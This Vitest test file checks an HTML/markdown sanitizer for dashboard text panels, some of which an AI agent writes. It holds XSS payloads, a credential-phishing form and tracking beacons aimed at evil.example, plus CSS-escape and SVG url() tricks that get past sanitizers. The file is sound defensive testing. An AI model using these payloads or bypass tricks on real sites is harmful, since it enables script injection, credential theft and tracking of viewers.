/**
 * @vitest-environment jsdom
 *
 * The sanitizer at the text-panel seam. jsdom because DOMPurify needs a DOM — and
 * because the fail-closed branch below is what happens when it does not have one.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';
import { marked } from 'marked';
import { toSafePanelHtml } from '../panelHtml';
// The real agent artifact: its panel 1 is the markdown text panel that every agent
// dashboard ships, and therefore the content that actually travels this path.
import agentArtifact from '@/components/reports/__tests__/fixtures/agent-artifact.json';

describe('the hole this closes', () => {
  it('marked itself passes an event handler and a javascript: URL straight through', () => {
    // Not a claim about our code — a claim about the parser it used to inject raw.
    expect(marked.parse('note <img src=x onerror="alert(1)">', { breaks: true, gfm: true }))
      .toContain('onerror');
    expect(marked.parse('[click](javascript:alert(1))', { breaks: true, gfm: true }))
      .toContain('javascript:');
  });
});

describe('toSafePanelHtml — markdown', () => {
  it('strips an inline event handler', () => {
    const html = toSafePanelHtml('AI note. <img src=x onerror="alert(1)">', 'markdown');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('alert(1)');
  });

  it('strips a javascript: link', () => {
    const html = toSafePanelHtml('[click](javascript:alert(1))', 'markdown');
    expect(html).not.toContain('javascript:');
  });

  it('strips a script tag', () => {
    const html = toSafePanelHtml('before <script>alert(1)</script> after', 'markdown');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('alert(1)');
  });

  it('strips an svg onload payload', () => {
    expect(toSafePanelHtml('<svg onload=alert(1)>', 'markdown')).not.toContain('onload');
  });

  it('strips an iframe', () => {
    expect(toSafePanelHtml('<iframe src="https://evil.example"></iframe>', 'markdown'))
      .not.toContain('<iframe');
  });

  it('keeps ordinary markdown working', () => {
    const html = toSafePanelHtml('# Title\n\n- one\n- two\n\n**bold** and `code`', 'markdown');
    expect(html).toContain('<h1');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
  });

  it('keeps a normal link', () => {
    expect(toSafePanelHtml('[docs](https://example.com/x)', 'markdown'))
      .toContain('href="https://example.com/x"');
  });

  it('honours the breaks option TextPanel has always parsed with', () => {
    expect(toSafePanelHtml('one\ntwo', 'markdown')).toContain('<br>');
  });

  it('renders the real agent disclaimer panel unharmed', () => {
    const panel = agentArtifact.panels[0] as { type: string; options?: { mode?: string; content?: string } };
    expect(panel.type).toBe('text');
    const html = toSafePanelHtml(panel.options?.content ?? '', 'markdown');

    expect(html).toContain('This dashboard was created using an AI agent.');
    expect(html).toContain('<code>738dcdfe-f700-46e4-9802-510f2d7cabf3</code>');
    expect(html).not.toContain('<script');
  });
});

describe('toSafePanelHtml — html mode', () => {
  it('sanitizes content given as raw HTML, which used to be injected verbatim', () => {
    const html = toSafePanelHtml('<p>ok</p><img src=x onerror="alert(1)">', 'html');
    expect(html).toContain('<p>ok</p>');
    expect(html).not.toContain('onerror');
  });

  it('does not markdown-parse html-mode content', () => {
    expect(toSafePanelHtml('# not a heading', 'html')).not.toContain('<h1');
  });

  it('keeps benign author markup', () => {
    const html = toSafePanelHtml('<div class="note"><b>hi</b><a href="/x">link</a></div>', 'html');
    expect(html).toContain('<b>hi</b>');
    expect(html).toContain('href="/x"');
  });
});

describe('author markup the default config would have broken', () => {
  it('keeps target on a link, and forces rel so the opener handle is not shared', () => {
    const html = toSafePanelHtml('<a href="https://docs.example.com" target="_blank">Runbook</a>', 'html');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('forces rel on every element that opens a window, not just <a>', () => {
    // Both survive the config, both open a window from `target`, and neither is `A`:
    // <area> reports AREA, and an SVG anchor reports lowercase `a` because SVG keeps
    // its case. A `tagName === 'A'` test would drop the rel on both.
    // (!64 review round 5, finding 4)
    const area = toSafePanelHtml(
      '<map name="m"><area href="https://x.example" target="_blank"></map>', 'html');
    expect(area).toContain('<area');
    expect(area).toContain('rel="noopener noreferrer"');

    const svg = toSafePanelHtml(
      '<svg><a href="https://x.example" target="_blank"><text>t</text></a></svg>', 'html');
    expect(svg).toContain('target="_blank"');
    expect(svg).toContain('rel="noopener noreferrer"');
  });

  it('leaves rel off an element that cannot open anything', () => {
    // `ADD_ATTR: ['target']` allows the attribute on every tag, so the hook used to
    // hang a rel off <div target=x>. Harmless, but it made the code read as if it
    // were doing something it was not.
    expect(toSafePanelHtml('<div target="_blank">d</div>', 'html')).not.toContain('rel=');
  });

  it('treats a tag the same wherever it sits in the string', () => {
    // The parser hoists a LEADING style/title/meta into <head> and DOMPurify returns
    // only <body>, so an ALLOWED head-hoistable tag would behave differently depending
    // on whether text precedes it. Refusing <style> outright is what settles that —
    // this pins the outcome, so re-allowing the tag fails here rather than shipping
    // the asymmetry.
    const leading = toSafePanelHtml('<style>.k{color:red}</style><p class="k">C</p>', 'html');
    const trailing = toSafePanelHtml('<p class="k">C</p><style>.k{color:red}</style>', 'html');
    expect(leading).not.toContain('<style');
    expect(trailing).not.toContain('<style');
    expect(leading).toContain('<p class="k">C</p>');
    expect(trailing).toContain('<p class="k">C</p>');
  });

  it('keeps the class attribute, which is how a panel styles itself now', () => {
    expect(toSafePanelHtml('<p class="text-lg font-bold">Big</p>', 'html'))
      .toContain('class="text-lg font-bold"');
  });
});

describe('the injection surface script-blocking alone leaves open', () => {
  it('drops a document-wide style block that could hide the app', () => {
    const html = toSafePanelHtml('AI summary.\n<style>#root>*{display:none}</style>', 'markdown');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('display:none');
    expect(html).toContain('AI summary.');
  });

  it('drops an inline style that could cover the page', () => {
    const html = toSafePanelHtml('<div style="position:fixed;inset:0;z-index:9999">gotcha</div>', 'html');
    expect(html).not.toContain('style=');
    expect(html).not.toContain('position:fixed');
    expect(html).toContain('gotcha');
  });

  it('drops a credential form pointing at another origin', () => {
    const html = toSafePanelHtml(
      '<form action="https://evil.example" method="POST"><input name="pw" type="password"><button>Go</button></form>',
      'html',
    );
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('<button');
    expect(html).not.toContain('evil.example');
  });

  it('drops the same surfaces when they arrive through markdown', () => {
    const html = toSafePanelHtml('note\n\n<form action="https://evil.example"><input name="pw"></form>', 'markdown');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).toContain('note');
  });
});

/**
 * A panel that fetches from an origin its author chose reports the viewer's IP,
 * user-agent and anything in the query string to whoever wrote the panel — on the
 * SAVED report, on every later open, from content an AI agent produced after reading
 * rows of the customer's database. Round 5 pinned this as an accepted cost; round 6 was
 * right that documenting an exposure does not close it. (!64 review round 6, finding 4)
 */
describe('remote subresources are refused', () => {
  const beacon = 'https://evil.example';

  it('drops the src of a remote image, in both modes', () => {
    expect(toSafePanelHtml(`<img src="${beacon}/track.gif">`, 'html'))
      .not.toContain('evil.example');
    // Markdown reaches the same place with far less typing.
    expect(toSafePanelHtml(`![x](${beacon}/track.gif)`, 'markdown'))
      .not.toContain('evil.example');
  });

  it('covers every attribute the browser fetches from, not just <img src>', () => {
    const payloads = [
      `<video src="${beacon}/v.mp4"></video>`,
      `<video poster="${beacon}/p.jpg"></video>`,
      `<audio src="${beacon}/a.mp3"></audio>`,
      `<picture><source srcset="${beacon}/s.png"></picture>`,
      `<img src="/ok.png" srcset="/ok.png 1x, ${beacon}/2x.png 2x">`,
      `<track src="${beacon}/t.vtt">`,
      `<table background="${beacon}/bg.png"><tr><td>a</td></tr></table>`,
      // SVG carries its own fetches, and these are NOT in the reviewer's list —
      // they were found by probing the installed library.
      `<svg><image href="${beacon}/x.png" width="10" height="10"/></svg>`,
      `<svg><image xlink:href="${beacon}/x.png" width="10" height="10"/></svg>`,
      `<svg><feImage href="${beacon}/x.png"/></svg>`,
    ];
    for (const payload of payloads) {
      for (const mode of ['markdown', 'html'] as const) {
        expect(toSafePanelHtml(payload, mode)).not.toContain('evil.example');
      }
    }
  });

  it('keeps the element, dropping only the attribute that fetches', () => {
    // A broken image with its alt text is visible and honest; deleting the node would
    // make a panel silently shorter than the one that was previewed.
    const html = toSafePanelHtml(`<img src="${beacon}/t.gif" alt="chart">`, 'html');
    expect(html).toContain('<img');
    expect(html).toContain('alt="chart"');
    expect(html).not.toContain('src=');
  });

  it('leaves same-origin and data: URLs alone, which is what real panels use', () => {
    expect(toSafePanelHtml('<img src="/logo.png">', 'html')).toContain('src="/logo.png"');
    expect(toSafePanelHtml('<img src="logo.png">', 'html')).toContain('src="logo.png"');
    expect(toSafePanelHtml('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">', 'html'))
      .toContain('data:image/gif');
    expect(toSafePanelHtml('<img src="/a.png" srcset="/a.png 1x, /b.png 2x">', 'html'))
      .toContain('srcset=');
  });

  it('never touches a LINK to another origin — that is navigation, not a fetch', () => {
    const html = toSafePanelHtml('<a href="https://docs.example.com/runbook">Runbook</a>', 'html');
    expect(html).toContain('href="https://docs.example.com/runbook"');
  });

  it('fails closed on a value the URL parser refuses', () => {
    // A malformed AUTHORITY throws; a malformed scheme does not — `ht!tp://x` is
    // simply a relative path against our own origin, which is a request to our own
    // server and therefore not the thing this rule is about.
    expect(toSafePanelHtml('<img src="https://[">', 'html')).not.toContain('src=');
    expect(toSafePanelHtml('<img src="ht!tp://x">', 'html')).toContain('src=');
  });

  it('covers SVG`s url() references, which are fetches wearing presentation clothes', () => {
    // Round 6 filtered attribute NAMES and these walked past it: all eight survive the
    // config, and a real browser issues a GET for each — measured against a local
    // server, six requests for the six that paint. (!64 review round 7, finding 2)
    const attrs = ['fill', 'stroke', 'mask', 'clip-path', 'filter',
                   'marker-start', 'marker-mid', 'marker-end'];
    for (const attr of attrs) {
      for (const ref of [`url(${beacon}/l.svg#x)`, `url('${beacon}/l.svg#x')`,
                         `url( "${beacon}/l.svg" )`]) {
        const html = toSafePanelHtml(`<svg><rect ${attr}="${ref}" width="9" height="9"/></svg>`, 'html');
        expect(html, `${attr} leaked`).not.toContain('evil.example');
        // The element survives; only the reference is cut.
        expect(html).toContain('<rect');
      }
    }
  });

  it('fails closed on a url() it cannot parse, rather than assuming it is fine', () => {
    // An unbalanced quote matches no reference at all, so an "any match is remote"
    // rule would find nothing to object to and keep the attribute. Found by a typo in
    // the test above, which is a better provenance than it sounds: the rule now
    // requires every `url(` to parse AND resolve locally.
    const html = toSafePanelHtml(
      `<svg><rect fill="url('${beacon}/l.svg#x)" width="9" height="9"/></svg>`, 'html');
    expect(html).not.toContain('evil.example');

    // ...and one good reference does not launder a bad one beside it.
    const mixed = toSafePanelHtml(
      `<svg><rect fill="url(#g)" filter="url(#f) url(${beacon}/l.svg)" width="9" height="9"/></svg>`, 'html');
    expect(mixed).toContain('fill="url(#g)"');
    expect(mixed).not.toContain('evil.example');
  });

  it('resolves CSS escapes before scanning, because the browser does', () => {
    // Four evasions of a literal scan, every one of which issued a real request in
    // headless Chrome against a local server. Reading the raw attribute string means
    // reading a different language from the one that will execute.
    // (!64 review round 8, finding 2)
    const escaped = [
      // escape inside the function name — `url(` never appears in the raw value
      String.raw`fill="u\72l(${beacon}/name.svg#x)"`,
      // escape as the first character
      String.raw`fill="\75 rl(${beacon}/first.svg#x)"`,
      // escape in the SCHEME: scans fine, then resolves as a same-origin relative path
      String.raw`fill="url(https\3a //evil.example/scheme.svg#x)"`,
      // ...and the same without the whitespace terminator
      String.raw`mask="url(https\3A//evil.example/nospace.svg#x)"`,
    ];
    for (const attr of escaped) {
      const html = toSafePanelHtml(`<svg><rect ${attr} width="9" height="9"/></svg>`, 'html');
      expect(html, attr).not.toContain('evil.example');
    }
  });

  it('applies CSS input preprocessing, so a line continuation cannot smuggle a URL', () => {
    // REAL control characters, built here rather than written as text — the payload is
    // nothing without them. The browser turns CR, FF and CRLF into LF before it
    // tokenizes, and a backslash-newline inside a string is then a line continuation
    // that disappears: `url("https\<FF>://evil/x")` executes as `https://evil/x`, and
    // headless Chrome fetched it. (!64 review round 9)
    const FF = '\f';
    const LF = '\n';
    const CR = '\r';
    const continuations: Array<[string, string]> = [
      ['form feed', FF],
      ['line feed', LF],
      ['carriage return', CR],
      ['crlf', `${CR}${LF}`],
    ];
    for (const [name, newline] of continuations) {
      const html = toSafePanelHtml(
        `<svg><rect fill='url("https\\${newline}://evil.example/c.svg#x")' width="9" height="9"/></svg>`,
        'html');
      expect(html, name).not.toContain('evil.example');
    }

    // ...and a continuation in the middle of the host, which reassembles just as well.
    expect(toSafePanelHtml(
      `<svg><rect fill='url("https://ev\\${FF}il.example/h.svg#x")' width="9" height="9"/></svg>`, 'html'))
      .not.toContain('evil.example');
  });

  it('fails safe on a bare form feed, which CSS would treat as a bad string', () => {
    // Not a fetch in any browser — a raw newline inside a CSS string is a parse error.
    // Preprocessing makes us read it as the parser would and refuse it anyway, which is
    // the safe direction to be wrong in.
    expect(toSafePanelHtml(
      `<svg><rect fill='url("https:\f//evil.example/bare.svg#x")' width="9" height="9"/></svg>`, 'html'))
      .not.toContain('evil.example');
  });

  it('does not mangle a legitimate value that merely contains a backslash', () => {
    // Decoding is for the scan only; the attribute the browser gets is untouched.
    expect(toSafePanelHtml(String.raw`<p title="C:\Users\report">x</p>`, 'html'))
      .toContain(String.raw`title="C:\Users\report"`);
  });

  it('keeps the internal references that make SVG work at all', () => {
    // `url(#gradient)` is the legitimate case and by far the common one — it resolves
    // against our own document, so the same rule already says yes.
    const html = toSafePanelHtml(
      '<svg><defs><linearGradient id="g"></linearGradient></defs>'
      + '<rect fill="url(#g)" clip-path="url(#c)" width="9" height="9"/></svg>', 'html');
    expect(html).toContain('fill="url(#g)"');
    expect(html).toContain('clip-path="url(#c)"');
  });

  it('leaves a plain colour alone, url() or not', () => {
    expect(toSafePanelHtml('<svg><rect fill="#ff0000" width="9" height="9"/></svg>', 'html'))
      .toContain('fill="#ff0000"');
  });

  it('still refuses the loaders the config removes outright', () => {
    const blocked = [
      `<link rel="stylesheet" href="${beacon}/x.css">`,
      `<object data="${beacon}/o"></object>`,
      `<input type="image" src="${beacon}/i.png">`,
    ];
    for (const payload of blocked) {
      expect(toSafePanelHtml(payload, 'html')).not.toContain('evil.example');
    }
  });
});

/**
 * The `class` attribute survives sanitization, and the app's compiled stylesheet is
 * therefore the panel author's vocabulary. These tests pin the payload; what stops it
 * is `contain: layout` on TextPanel's injection wrapper, which is asserted in
 * TextPanel.test.tsx. The two are one control and must not be separated.
 * (!64 review round 6, finding 4)
 */
describe('the compiled-utility overlay this config allows through', () => {
  const overlay =
    '<a href="/login" class="fixed inset-0 z-50 bg-background">Session expired</a>';

  it('sanitizes to itself — the sanitizer is NOT what stops it', () => {
    const html = toSafePanelHtml(overlay, 'html');
    expect(html).toContain('class="fixed inset-0 z-50 bg-background"');
  });

  it('keeps `class`, which is the reason the containment exists', () => {
    // Removing `class` here would break legitimate styling and would still not contain
    // a payload built from arbitrary values; containment covers both.
    expect(toSafePanelHtml('<p class="text-lg font-bold">Big</p>', 'html'))
      .toContain('class="text-lg font-bold"');
  });
});

describe('without a DOM, it fails CLOSED', () => {
  // The docblock cites this branch as the reason the file chose jsdom, and nothing
  // entered it: returning `rendered` instead of escaping kept every other test green.
  //
  // The REAL library is asked for an instance bound to a runtime with no document —
  // which is exactly what it builds under Node or SSR. `sanitize` is not stubbed and
  // no flag is overwritten; the module under test simply holds an instance that
  // reports `isSupported: false`. (Flipping the shared singleton's flag no longer
  // reaches it: the module keeps a private instance now. Round 4, finding 6.)
  const withoutDom = async () => {
    vi.doMock('dompurify', async () => {
      const actual = await vi.importActual<typeof import('dompurify')>('dompurify');
      return { default: () => actual.default({} as never) };
    });
    vi.resetModules();
    return (await import('../panelHtml')).toSafePanelHtml;
  };

  afterEach(() => {
    vi.doUnmock('dompurify');
    vi.resetModules();
  });

  it('escapes the content to text rather than passing HTML through', async () => {
    const safeHtml = await withoutDom();
    const html = safeHtml('<img src=x onerror="alert(1)">', 'markdown');

    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
    expect(html).toContain('onerror=&quot;alert(1)&quot;');
  });

  it('escapes html-mode content the same way', async () => {
    const safeHtml = await withoutDom();
    expect(safeHtml('<b>hi</b>', 'html')).toBe('&lt;b&gt;hi&lt;/b&gt;');
  });

  it('escapes the RAW content, never the parsed markdown', async () => {
    const safeHtml = await withoutDom();
    // Escaping marked's output would leak the parser's own tags as visible text.
    expect(safeHtml('# Title', 'markdown')).toBe('# Title');
  });
});

describe('the sanitizer instance is private to this module', () => {
  it('does not install its rel hook on the shared DOMPurify singleton', async () => {
    // Whether some future DOMPurify.sanitize() elsewhere in src inherits our
    // rel-forcing hook must not depend on whether a text panel rendered first.
    const shared = (await vi.importActual<typeof import('dompurify')>('dompurify')).default;

    expect(toSafePanelHtml('<a href="https://x.example" target="_blank">go</a>', 'html'))
      .toContain('rel="noopener noreferrer"');
    expect(shared.sanitize('<a href="https://x.example" target="_blank">go</a>', { ADD_ATTR: ['target'] }))
      .not.toContain('rel=');
  });
});

describe('edge cases', () => {
  it('returns empty for empty content', () => {
    expect(toSafePanelHtml('', 'markdown')).toBe('');
    expect(toSafePanelHtml('', 'html')).toBe('');
  });

  it('never returns a string carrying an on* handler, whatever the mode', () => {
    const payloads = [
      '<img src=x onerror=alert(1)>',
      '<body onload=alert(1)>',
      '<a href="jAvAsCrIpT:alert(1)">x</a>',
      '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
      '<form><button formaction="javascript:alert(1)">x</button></form>',
    ];
    for (const payload of payloads) {
      for (const mode of ['markdown', 'html'] as const) {
        const html = toSafePanelHtml(payload, mode);
        expect(html.toLowerCase()).not.toMatch(/\son\w+\s*=/);
        expect(html.toLowerCase()).not.toContain('javascript:');
      }
    }
  });
});
